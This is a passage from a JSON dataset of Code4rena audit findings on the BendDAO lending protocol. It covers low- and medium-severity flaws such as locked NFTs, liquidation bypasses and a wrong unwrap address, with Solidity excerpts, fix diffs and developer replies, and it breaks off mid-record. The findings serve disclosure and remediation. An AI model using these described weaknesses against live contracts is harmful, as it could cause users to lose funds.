        "000000",
        "ether\\_sky",
        "Obsidian",
        "A2-security",
        "stuart\\_the\\_minion",
        "Nihavent",
        "dhank",
        "Varun\\_05",
        "rilwan99",
        "TessKimy",
        "wellbyt3",
        "0xc0ffEE",
        "almurhasan",
        "Honour"
      ]
    },
    {
      "id": "36912",
      "title": "[10] Users are not able to unstake their NFTs",
      "impact": "LOW",
      "content": "\nThe admin is not trusted. So in case the user/account has a staked and the admin calls `YieldStakingBase.sol#setNftActive()` function to deactivate that NFT in this protocol. The users now are not able to unstake their NFTs (it will revert).\n\n```solidity\nFile: YieldStakingBase.sol#_unstake\n\n     YieldNftConfig storage nc = nftConfigs[nft];\n     require(nc.isActive, Errors.YIELD_ETH_NFT_NOT_ACTIVE);\n```\n\nTo fix this you need to check if users use this NFT first, or don't check if the NFT is active in the unstake operation. \n\n**[thorseldon (BendDAO) commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/33#issuecomment-2326671400):**\n> [01] - Reviewed and Acknowledged.<br>\n> [02] - Reviewed and Acknowledged. We will use or add new wrapped token for those rebasing tokens. E.g., wstETH for stETH, weETH for eETH.<br>\n> [03] - Reviewed and Acknowledged.<br>\n> [04] - Reviewed and Acknowledged. The auction mechanism is same with our V1 and running as wished.<br>\n> [05] - Reviewed and Acknowledged. To avoid bad debt should be top priority in case of liquidation, there's no need to the `supplyCap` checks. And repay debt should be supported even `isFrozen` is true.<br>\n> [06] - Reviewed and Fixed [here](https://github.com/BendDAO/bend-v2/commit/0f872343bbc6a6dd00187749f2d37048034c56fa).<br>\n> [07] - Reviewed and Acknowledged. The `nftDebt` is calculated in the same tx when user do the repay, it should not exceed the borrow amount in the lending pool in theory.<br>\n> [08] - Reviewed and Fixed [here](https://github.com/BendDAO/bend-v2/commit/d226b0d76a48e13bf4fc7ff970465b8b050d11af).<br>\n> [09] - Reviewed and Fixed [here](https://github.com/BendDAO/bend-v2/commit/95c98c9e4049037afa07403e21708f1acc168d20).<br>\n> [10] - Reviewed and Acknowledged. The Active flag should only be set to false when there's emergency situation and the Untrusted Admin should belong to decentralized risk. We will use multi-signature and timelock in our protocol governance.\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "36911",
      "title": "[09] The removed assets (ERC721/ERC20) can't be added again",
      "impact": "LOW",
      "content": "\nIn this case the admin calls `Configurator.sol#addAssetERC20()` then after period of time he invokes `Configurator.sol#removeAssetERC20()` after that.\n\nhttps://github.com/code-423n4/2024-07-benddao/blob/main/src/modules/Configurator.sol#L82-L85\n\n```solidity\n  function removeAssetERC20(uint32 poolId, address asset) public nonReentrant {\n    address msgSender = unpackTrailingParamMsgSender();\n    ConfigureLogic.executeRemoveAssetERC20(msgSender, poolId, asset);\n  }\n```\n\nHe will be not able to call `addAssetERC20()` again because `removeAssetERC20()` will not remove the token from `assetLookup[]` map; it just removes from `assetList`. When he tries to call `addAssetERC20()` again this check in `executeAddAssetERC20()` will revert transaction.\n\n```solidity\nFile: ConfigureLogic.sol#executeAddAssetERC20()\n\n    require(assetData.assetType == 0, Errors.ASSET_ALREADY_EXISTS);\n```\n\nTo fix this delete all values inside the `assetLookup[]` map.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "36910",
      "title": "[08] The NFT of the user is locked, in case the admin updates the `yieldCap` to zero",
      "impact": "LOW",
      "content": "\nIn `YieldLogic.sol#executeYieldSetERC721TokenData()`, reference [this check](https://github.com/code-423n4/2024-07-benddao/blob/main/src/libraries/logic/YieldLogic.sol#L138):\n\n```solidity\nFile: YieldLogic.sol#executeYieldSetERC721TokenData()\n\n146:     require(ymData.yieldCap > 0, Errors.YIELD_EXCEED_STAKER_CAP_LIMIT);\n```\n\nIn this case the user calls `YieldStakingBase.sol#Unstake()` then the admin triggers `executeSetManagerYieldCap()` to set the `ymData.yieldCap` to zero. The user now can't call `YieldStakingBase.sol#repay()` because the transaction will revert to the above check.\n\nThe NFT of the user is locked. the only way to unlock it is by the admin, he needs to re-set `ymData.yieldCap > 0`. However, the user will pay the interest from his yield when he waiting for the admin to re-set the value. To fix this just move this check inside the first `IF` block:\n\n```diff\n-   require(ymData.yieldCap > 0, Errors.YIELD_EXCEED_STAKER_CAP_LIMIT);\n\n    if (params.isLock) {\n+   require(ymData.yieldCap > 0, Errors.YIELD_EXCEED_STAKER_CAP_LIMIT);\n      VaultLogic.erc721SetTokenLockerAddr(nftAssetData, params.tokenId, lockerAddr);\n    }\n```\n\nThat way, the user can call `repay()` in this scenario.   \n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "36909",
      "title": "[07] User funds could get locked",
      "impact": "LOW",
      "content": "\nThe `YieldStakingBase.sol#_repay()` in sub-call to `Yield.sol#yieldRepayERC20()` and pass `vars.nftDeb` as amount.\n\n```solidity\nFile: YieldStakingBase.sol#_repay()\n\n438:     poolYield.yieldRepayERC20(poolId, address(underlyingAsset), vars.nftDebt);\n```\n\nHowever, in `YieldLogic.sol#executeYieldRepayERC20` [this checks](https://github.com/code-423n4/2024-07-benddao/blob/main/src/libraries/logic/YieldLogic.sol#L106-L108):\n\n```solidity\nFile: YieldLogic.sol\n\n106:     if (vars.stakerBorrow < params.amount) {\n107:       params.amount = vars.stakerBorrow;\n108:     }\n```\n\nIn case the above `IF` is true, the difference in the amount will be locked. Users could lose some of their claimed yields that are saved in `vars.remainAmount` or will pay more extra amount that he needs `vars.extraAmount`.\n\n```solidity\nFile: YieldStakingBase.sol#_repay()\n\n    vars.claimedYield = protocolClaimWithdraw(sd);\n\n    vars.nftDebt = _getNftDebtInUnderlyingAsset(sd);\n    vars.nftDebtWithFine = vars.nftDebt + sd.unstakeFine; \n\n    // compute repay value\n    if (vars.claimedYield >= vars.nftDebtWithFine) {\n      vars.remainAmount = vars.claimedYield - vars.nftDebtWithFine;\n    } else {\n      vars.extraAmount = vars.nftDebtWithFine - vars.claimedYield;\n    }\n```\n\nTo fix this call `yieldRepayERC20()`, which should return the delta amount to `_repay()` and update `vars.remainAmount` or `vars.extraAmount` as it suits then transfer to/from the sender.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "36908",
      "title": "[06] Missing check `isBorrowingEnabled`",
      "impact": "LOW",
      "content": "\nThe `ValidateLogic.sol#validateYieldBorrowERC20()` doesn't check if borrowing is enabled `isBorrowingEnabled`. Fix it with is check: `require(assetData.isBorrowingEnabled, Errors.ASSET_IS_BORROW_DISABLED);`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "36907",
      "title": "[05] Liquidators can bypass `supplyCap` and `isFrozen` checks",
      "impact": "LOW",
      "content": "\nIn [`BVault.sol#depositERC20()`](https://github.com/code-423n4/2024-07-benddao/blob/main/src/libraries/logic/ValidateLogic.sol#L87-L95) it checks:\n\n1. `if (assetData.supplyCap != 0)`\n2.  `require(!assetData.isFrozen, Errors.ASSET_IS_FROZEN);`\n\nAny Liquidator can call `CrossLiquidation.sol#crossLiquidateERC20()` set `supplyAsCollateral == true` and bypass the two above rules. To fix this you can delete this feature or add both the checks in `_supplyUserERC20CollateralToLiquidator()` and if one of them is true just send the fund directly to the liquidator.\n\nThe same thing with `LiquidationLogic.sol#executeCrossLiquidateERC721()`:\n\n```solidity\nif (vars.remainDebtToLiquidate > 0) {\n      // transfer the remain debt asset to the user as new supplied collateral\n      VaultLogic.erc20IncreaseCrossSupply(debtAssetData, params.borrower, vars.remainDebtToLiquidate);\n\n      // If the collateral is supplied at first we need set the supply flag\n      VaultLogic.accountCheckAndSetSuppliedAsset(poolData, debtAssetData, params.borrower);\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "36906",
      "title": "[04] The isolate auction is not the best system",
      "impact": "LOW",
      "content": "\nIn the isolate auction `IsolateLiquidation.sol#isolateAuction()` the liquidators will just keep bidding a bigger amount in the auction then, the winner will only pay the `borrowAmount` and receive back all the extra money he previously paid.\n\n```solidity\nFile: IsolateLogic.sol#executeIsolateLiquidate()\n\n435:       if (loanData.bidAmount > vars.borrowAmount) {\n436:         vars.remainBidAmounts[vars.nidx] = loanData.bidAmount - vars.borrowAmount;\n437:       }\n```\n\nThe isolated auction doesn't make any sense. It just gives the borrower a chance to redeem his loan. I believe this can be done by just direct liquidation with a buffer period to give the borrower a chance to redeem his loan.\n\nAlso, Liquidators are not incentivized to launch the auction at the right time. If he loses the auction he has no reward for doing the job at the right time (the only thing he has is to hope for the user to call `executeIsolateRedeem()` to receive the bid fines).\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "36905",
      "title": "[03] `executeIsolateAuction()` re-set the `lastBidder` address but with the same `bidAmount`",
      "impact": "LOW",
      "content": "\nWith low decimals (`< 6`), [this in scope line](https://github.com/code-423n4/2024-07-benddao/blob/main/src/libraries/logic/IsolateLogic.sol#L249) could return `0`.\n\n```solidity\nFile: IsolateLogic.sol#executeIsolateAuction()\n\n249:         vars.minBidDelta = vars.borrowAmount.percentMul(PercentageMath.ONE_PERCENTAGE_FACTOR);\n250:         require(\n251:           params.amounts[vars.nidx] >= (loanData.bidAmount + vars.minBidDelta),\n252:           Errors.ISOLATE_BID_PRICE_LESS_THAN_HIGHEST_PRICE\n253:         );\n```\n\nThe next require check is `vars.minBidDelta == 0` it will just accept to re-set the liquidator address but with the same `bidAmount`:\n\n```solidity\nFile: IsolateLogic.sol#executeIsolateAuction()\n\n256:       // record last bid state\n257:       loanData.lastBidder = params.msgSender;\n258:       loanData.bidAmount = params.amounts[vars.nidx];\n```\n\nLiquidators can just back-run another liquidator to gain the auction. To fix this issue you can add 1 `loanData.bidAmount + vars.minBidDelta + 1` or accept only grate the values `params.amounts[vars.nidx] > (loanData.bidAmount + vars.minBidDelta)`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "36904",
      "title": "[02] User will lose the rebasing tokens",
      "impact": "LOW",
      "content": "\nBalance changes outside of transfers are in scope.\n\nThose tokens will make arbitrary balance modifications outside of transfers. Users who supply [`BVault.sol#depositERC20()`](https://github.com/code-423n4/2024-07-benddao/blob/main/src/modules/BVault.sol#L20-L45) with that type of token will lose any rebasing/airdrops tokens, and the funds will get locked in the `PoolManager.sol` contract.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "36903",
      "title": "[01] liquidation functions not work in the case of  ERC20 with the Pausability feature",
      "impact": "LOW",
      "content": "\nERC20 with the Pausability feature is in scope. \n\nIn case any `underlyingAsset` gets paused the liquidations functions will not work (e.g., [`IsolateLiquidation.sol#isolateAuction(`)](https://github.com/code-423n4/2024-07-benddao/blob/main/src/modules/IsolateLiquidation.sol#L20-L46)) because it sub-calls to [`VaultLogic.sol#erc20TransferInBidAmount()`](https://github.com/code-423n4/2024-07-benddao/blob/main/src/libraries/logic/VaultLogic.sol#L468-L478) it will just revert, the same thing with `IsolateLending.sol#isolateRedeem()`, `CrossLiquidation.sol#crossLiquidateERC721()` and `CrossLiquidation.sol#crossLiquidateERC20()`.\n\nThis could leave the protocol with bad debt opened for an unknown period of time. \n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "36902",
      "title": "[M-20] Incorrect `unwrapNativeTokenInWallet` receiver address",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2024-07-benddao/blob/main/src/modules/BVault.sol#L74><br><https://github.com/code-423n4/2024-07-benddao/blob/main/src/modules/CrossLending.sol#L50><br><https://github.com/code-423n4/2024-07-benddao/blob/main/src/modules/IsolateLending.sol#L51>\n\n### Impact\n\nIf the user specifies native tokens as output assets, the protocol will mistakenly try to unwrap wrapped tokens from the `msg.sender` instead of the `receiver` address that was specified in the function call.\n\n### Proof of Concept\n\nThis issue occurs in the following modules:\n\n- BVault\n- CrossLending\n- IsolateLending\n\nUsers are allowed to specify an output asset when borrowing/withdrawing funds from the protocol. If the output asset is a native token, a wrapped version will be sent to the receiver via the `erc20TransferOutLiquidity` function, and then the receiver of these tokens must send them to the protocol, which will unwrap and send them back:\n\n```solidity\n  function unwrapNativeTokenInWallet(address wrappedNativeToken, address user, uint256 amount) internal {\n    require(amount > 0, Errors.INVALID_AMOUNT);\n\n    bool success = IWETH(wrappedNativeToken).transferFrom(user, address(this), amount);\n    require(success, Errors.TOKEN_TRANSFER_FAILED);\n\n    IWETH(wrappedNativeToken).withdraw(amount);\n\n    safeTransferNativeToken(user, amount);\n  }\n```\n\nThe problem here is that the wrapped tokens will be sent to the `params.receiver` address, but the `unwrapNativeTokenInWallet` function will try to get them from `msg.sender`, who may not have them in the wallet. As a result withdraw/borrow functionality may fail if `msg.sender` `!=` `receiver`:\n\n```solidity\n  function withdrawERC20(\n    uint32 poolId,\n    address asset,\n    uint256 amount,\n    address onBehalf,\n    address receiver\n  ) public whenNotPaused nonReentrant {\n    address msgSender = unpackTrailingParamMsgSender();\n    DataTypes.PoolStorage storage ps = StorageSlot.getPoolStorage();\n    bool isNative;\n    if (asset == Constants.NATIVE_TOKEN_ADDRESS) {\n      isNative = true;\n      asset = ps.wrappedNativeToken;\n    }\n\n    SupplyLogic.executeWithdrawERC20(\n      InputTypes.ExecuteWithdrawERC20Params({\n        msgSender: msgSender,\n        poolId: poolId,\n        asset: asset,\n        amount: amount,\n        onBehalf: onBehalf,\n>>      receiver: receiver\n      })\n    );\n\n    if (isNative) {\n>>    VaultLogic.unwrapNativeTokenInWallet(asset, msgSender, amount);\n    }\n  }\n```\n\nSame in `crossBorrowERC20` and `isolateBorrow` functions.\n\n### Recommended Mitigation Steps\n\n```diff\n    if (isNative) {\n-     VaultLogic.unwrapNativeTokenInWallet(asset, msgSender, amount);\n+     VaultLogic.unwrapNativeTokenInWallet(asset, receiver, amount);\n    }\n```\n\n### Assessed type\n\nToken-Transfer\n\n**[thorseldon (BendDAO) confirmed and commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/4#issuecomment-2297801133):**\n > Fixed [here](https://github.com/BendDAO/bend-v2/commit/8d2851a0cff5df4b14d6913246730338f5fe8099).\n\n***\n\n",
      "summary": "\nThe bug report discusses an issue in the code for the BendDAO protocol where if a user specifies native tokens as output assets, the protocol will mistakenly try to unwrap wrapped tokens from the wrong address. This can cause issues with withdrawing or borrowing funds from the protocol. The bug has been identified in three modules and the recommended mitigation step is to change one line of code to fix the issue. The bug has been confirmed and fixed by the BendDAO team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "https://github.com/code-423n4/2024-07-benddao-findings/issues/4",
      "tags": [],
      "finders": [
        "oakcobalt",
        "SpicyMeatball"
      ]
    },
    {
      "id": "36901",
      "title": "[M-19] Protocol should update interest rate after changing rate model in the configurator module",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2024-07-benddao/blob/main/src/libraries/logic/ConfigureLogic.sol#L526><br><https://github.com/code-423n4/2024-07-benddao/blob/main/src/libraries/logic/ConfigureLogic.sol#L626>\n\n### Impact\n\nAfter updating the interest model, the protocol does not update the interest rate, resulting in interest being calculated at the old model rates for some time.\n\n### Proof of Concept\n\nThe pool admin can change rate model in the `Configurator.sol` module:\n\n```solidity\n  function executeSetAssetLendingRate(\n    address msgSender,\n    uint32 poolId,\n    address asset,\n    uint8 groupId,\n    address rateModel_\n  ) internal {\n    DataTypes.PoolStorage storage ps = StorageSlot.getPoolStorage();\n\n    require(groupId >= Constants.GROUP_ID_LEND_MIN, Errors.INVALID_GROUP_ID);\n    require(groupId <= Constants.GROUP_ID_LEND_MAX, Errors.INVALID_GROUP_ID);\n    require(rateModel_ != address(0), Errors.INVALID_ADDRESS);\n\n    DataTypes.PoolData storage poolData = ps.poolLookup[poolId];\n    _validateCallerAndPool(msgSender, ps, poolData);\n\n    DataTypes.AssetData storage assetData = poolData.assetLookup[asset];\n    require(assetData.underlyingAsset != address(0), Errors.ASSET_NOT_EXISTS);\n    require(assetData.assetType == Constants.ASSET_TYPE_ERC20, Errors.ASSET_TYPE_NOT_ERC20);\n\n    require(assetData.groupList.contains(groupId), Errors.GROUP_NOT_EXISTS);\n\n    DataTypes.GroupData storage groupData = assetData.groupLookup[groupId];\n>>  groupData.rateModel = rateModel_;\n\n    emit Events.SetAssetLendingRate(poolId, asset, groupId, rateModel_);\n  }\n```\n\nHowever, interest rate is not updated, meaning interest will be calculated with the cached old model rates until `InterestLogic.updateInterestRates` is finally called.\n\n### Recommended Mitigation Steps\n\n```diff\n    ---SNIP---\n\n    DataTypes.GroupData storage groupData = assetData.groupLookup[groupId];\n    groupData.rateModel = rateModel_;\n+   InterestLogic.updateInterestRates(poolData, assetData, 0, 0)\n\n    emit Events.SetAssetLendingRate(poolId, asset, groupId, rateModel_);\n  }\n```\n\n**[thorseldon (BendDAO) confirmed and commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/5#issuecomment-2297801984):**\n > Fixed [here](https://github.com/BendDAO/bend-v2/commit/2a3d10adcd879b70835e8f1dcf9408b2fc817021).\n>\n> We suggest adjust the severity level to Low Risk or Information, because there's many TX action will frequently trigger to update the interest index, e.g., borrow/repay. We check the same logic exist in Aave V2 & V3.\n\n**[0xTheC0der (judge) commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/5#issuecomment-2298743678):**\n > Thanks for adding that clarification!  \n> \n> Similar case as in [Issue #7](https://github.com/code-423n4/2024-07-benddao-findings/issues/7). The same reasoning applies here.\n\n***\n\n",
      "summary": "\nThe report discusses a bug in the ConfigureLogic.sol file of the BendDAO project. The bug causes the interest rate to not update after the interest model is changed, resulting in interest being calculated at the old model rates for some time. This can be fixed by adding a line of code in the Configurator.sol module. The severity of this bug is considered low risk or informational as it can be triggered frequently by other actions. The bug has been fixed in the BendDAO project and a similar issue has been found in Aave V2 and V3. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "https://github.com/code-423n4/2024-07-benddao-findings/issues/5",
      "tags": [],
      "finders": [
        "SpicyMeatball"
      ]
    },
    {
      "id": "36900",
      "title": "[M-18] Updating fee factor may create issues for the protocol",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2024-07-benddao/blob/main/src/libraries/logic/ConfigureLogic.sol#L509-L521><br><https://github.com/code-423n4/2024-07-benddao/blob/117ef61967d4b318fc65170061c9577e674fffa1/src/libraries/logic/InterestLogic.sol#L248><br><https://github.com/code-423n4/2024-07-benddao/blob/117ef61967d4b318fc65170061c9577e674fffa1/src/libraries/logic/InterestLogic.sol#L201-L202>\n\n### Impact\n\nWhen the protocol fee is modified in the `Configurator` module:\n\n- The new fee percentage will be applied to the interest collected before the fee change.\n- The protocol will use the supply rate that was calculated using the old fee factor.\n\n### Proof of Concept\n\nThe `feeFactor` parameter is used to calculate amount of interest that goes to the treasury:\n\n```solidity\n  function _accrueFeeToTreasury(\n    DataTypes.AssetData storage assetData,\n    DataTypes.GroupData storage groupData,\n    uint256 prevGroupBorrowIndex\n  ) internal {\n    AccrueToTreasuryLocalVars memory vars;\n\n    if (assetData.feeFactor == 0) {\n      return;\n    }\n\n    vars.totalScaledBorrow = groupData.totalScaledCrossBorrow + groupData.totalScaledIsolateBorrow;\n\n    //calculate the total debt at moment of the last interaction\n    vars.prevTotalBorrow = vars.totalScaledBorrow.rayMul(prevGroupBorrowIndex);\n\n    //calculate the new total debt after accumulation of the interest on the index\n    vars.currTotalBorrow = vars.totalScaledBorrow.rayMul(groupData.borrowIndex);\n\n    //debt accrued is the sum of the current debt minus the sum of the debt at the last update\n    vars.totalDebtAccrued = vars.currTotalBorrow - vars.prevTotalBorrow;\n\n>>  vars.amountToMint = vars.totalDebtAccrued.percentMul(assetData.feeFactor);\n\n    if (vars.amountToMint != 0) {\n      assetData.accruedFee += vars.amountToMint.rayDiv(assetData.supplyIndex).toUint128();\n    }\n```\n\nTo adjust the asset's supply rate taking into account fee collected by the treasury:\n\n```solidity\n  function updateInterestRates(\n    DataTypes.PoolData storage poolData,\n    DataTypes.AssetData storage assetData,\n    uint256 liquidityAdded,\n    uint256 liquidityTaken\n  ) internal {\n    ---SNIP---\n    // calculate the asset supply rate\n    vars.nextAssetSupplyRate = vars.nextAssetBorrowRate.rayMul(vars.assetUtilizationRate);\n    vars.nextAssetSupplyRate = vars.nextAssetSupplyRate.percentMul(\n      PercentageMath.PERCENTAGE_FACTOR - assetData.feeFactor\n    );\n>>  assetData.supplyRate = vars.nextAssetSupplyRate.toUint128();\n```\n\nA discrepancy may occur when the pool admin changes the `feeFactor`. The new `feeFactor` will be applied to interest collected before the `feeFactor` was updated:\n\n```solidity\nfunction updateInterestIndexs(\n    DataTypes.PoolData storage /*poolData*/,\n    DataTypes.AssetData storage assetData\n  ) internal {\n    ---SNIP---\n    for (vars.i = 0; vars.i < vars.assetGroupIds.length; vars.i++) {\n      vars.loopGroupId = uint8(vars.assetGroupIds[vars.i]);\n      DataTypes.GroupData storage loopGroupData = assetData.groupLookup[vars.loopGroupId];\n      vars.prevGroupBorrowIndex = loopGroupData.borrowIndex;\n      _updateBorrowIndex(assetData, loopGroupData);\n>>    _accrueFeeToTreasury(assetData, loopGroupData, vars.prevGroupBorrowIndex);\n    }\n\n    // save updating time\n    assetData.lastUpdateTimestamp = uint40(block.timestamp);\n  }\n```\n\nBut the protocol will still use the old supply rate that was calculated using the previous `feeFactor`. This may cause inconsistencies in the fee accounting for the protocol.\n\n### Recommended Mitigation Steps\n\n```diff\n  function executeSetAssetProtocolFee(address msgSender, uint32 poolId, address asset, uint16 feeFactor) internal {\n\n+   InterestLogic.updateInterestIndexs(poolData, assetData);\n    assetData.feeFactor = feeFactor;\n+   InterestLogic.updateInterestRates(poolData, assetData, 0, 0);\n\n    emit Events.SetAssetProtocolFee(poolId, asset, feeFactor);\n  }\n```\n\n**[thorseldon (BendDAO) confirmed and commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/7#issuecomment-2297806691):**\n > Fixed [here](https://github.com/BendDAO/bend-v2/commit/2a3d10adcd879b70835e8f1dcf9408b2fc817021).\n>\n> We suggest adjust the severity level to Low Risk or Information, because there's many TX action will frequently trigger to update the interest index, e.g., borrow/repay. We check the same logic exist in Aave V2 & V3.\n\n**[0xTheC0der (judge) commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/7#issuecomment-2298738080):**\n > Thanks for that additional clarification about the likelihood of this being an issue.  \n> \n> Due to the possibility of fixing this and avoiding even temporary impacts and in consistency with other parameter change relates issues (see [Issue #8](https://github.com/code-423n4/2024-07-benddao-findings/issues/8) and [Issue #26](https://github.com/code-423n4/2024-07-benddao-findings/issues/26)), I'd like to maintain Medium severity.\n\n***\n\n",
      "summary": "\nThe bug report is about a discrepancy that may occur when the protocol fee is modified in the `Configurator` module. The impact of this bug is that the new fee percentage will be applied to the interest collected before the fee change, but the protocol will still use the supply rate that was calculated using the old fee factor. This may cause inconsistencies in the fee accounting for the protocol. To mitigate this issue, the recommended steps are to update the interest index and rates when changing the fee factor. The severity of this bug is currently considered medium, but it is suggested to adjust it to low risk or information since it may not occur frequently and can be fixed easily. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "https://github.com/code-423n4/2024-07-benddao-findings/issues/7",
      "tags": [],
      "finders": [
        "oakcobalt",
        "SpicyMeatball"
      ]
    },
    {
      "id": "36899",
      "title": "[M-17] Changing auction duration will have effect on ongoing auctions",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2024-07-benddao/blob/main/src/libraries/logic/ConfigureLogic.sol#L504><br><https://github.com/code-423n4/2024-07-benddao/blob/117ef61967d4b318fc65170061c9577e674fffa1/src/libraries/logic/IsolateLogic.sol#L320-L321><br><https://github.com/code-423n4/2024-07-benddao/blob/117ef61967d4b318fc65170061c9577e674fffa1/src/libraries/logic/IsolateLogic.sol#L423-L424>\n\n### Impact\n\nAuctions created before the auction duration was changed will have their duration shortened/extended, which may catch their participants off guard.\n\n### Proof of Concept\n\nWhen an isolated position reaches it's liquidation threshold, users can put it up for auction to pay off the debt and take the collateral NFT. The auction has a fixed duration during which borrower can redeem the debt and if it doesn't happen, the last bidder will pay off the debt and receive the NFT at the end.\n\nThe `PoolAdmin` can customize the `auctionDuration` variable with the `setAssetAuctionParams` function. This can be a problem because the protocol checks whether the auction has ended as follows:\n\n```solidity\n      vars.auctionEndTimestamp = loanData.bidStartTimestamp + nftAssetData.auctionDuration;\n      require(block.timestamp > vars.auctionEndTimestamp, Errors.ISOLATE_BID_AUCTION_DURATION_NOT_END);\n\n      vars.auctionEndTimestamp = loanData.bidStartTimestamp + nftAssetData.auctionDuration;\n      require(block.timestamp <= vars.auctionEndTimestamp, Errors.ISOLATE_BID_AUCTION_DURATION_HAS_END);\n```\n\nThus, the new duration will be applied to auctions that were started before the duration change. For example, if the duration was shortened, some auctions will end prematurely, which may be unexpected for its participants.\n\n### Recommended Mitigation Steps\n\nConsider calculating and storing the auction end time instead of the start time:\n\n```diff\n-       loanData.bidStartTimestamp = uint40(block.timestamp);\n+       loanData.auctionEndTimestamp = uint40(block.timestamp) + nftAssetData.auctionDuration;\n```\n\n### Assessed type\n\nTiming\n\n**[thorseldon (BendDAO) disputed and commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/8#issuecomment-2297814184):**\n > This is our service design as expected. We will try to avoid the adjust the parameters when some auctions going on. But maybe we want to adjust the auction duration sometimes when there's auction triggered by some emergency cases; no one can predict the emergency cases in the future, but we keep this flexibility.\n\n**[0xTheC0der (judge) commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/8#issuecomment-2298729330):**\n > Similar to my reasoning in [Issue #26](https://github.com/code-423n4/2024-07-benddao-findings/issues/26), I understand that the centralized aspect is intended, carefully considered and out of scope. However, on contract level these parameter changes can have implications that harm users, therefore Medium severity seems justified.  \n> \n> Nevertheless, I am open for further discussion (also with wardens) whether to consistently downgrade all of those DAO parameter change related issues or keep them.\n\n***\n\n",
      "summary": "\nThe report discusses a potential issue in the BendDAO protocol that may affect auctions created before the auction duration was changed. This could result in the duration being shortened or extended, catching participants off guard. The report suggests a mitigation step to calculate and store the auction end time instead of the start time to avoid this issue. The issue is assessed as a timing issue and is considered to have a medium severity level. Further discussion is recommended to determine if all similar issues related to DAO parameter changes should be downgraded or not.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "https://github.com/code-423n4/2024-07-benddao-findings/issues/8",
      "tags": [],
      "finders": [
        "SpicyMeatball"
      ]
    },
    {
      "id": "36898",
      "title": "[M-16] Borrower can prevent yield position repayment and closure by the bot",
      "impact": "MEDIUM",
